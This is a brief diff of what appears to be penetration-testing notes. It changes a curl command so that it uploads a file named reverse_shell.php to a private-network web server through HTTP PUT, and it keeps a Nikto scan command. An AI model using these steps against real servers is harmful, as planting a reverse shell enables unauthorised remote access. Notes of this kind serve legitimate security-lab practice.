@@ -72,7 +72,7 @@
 
 # Uploading files using curl when PUT enabled
 
-	1. curl http://10.0.2.12/test/ --upload-file test.php
-	
+	1. curl --upload-file  <fileNameToUpload> -v --url http://192.168.159.132/test/reverse_shell.php -0 --http1.0
+			-0 : http version to be used	
 # Nikto commands
 	1. nikto -host 10.0.2.12 -port 80 -root /test/
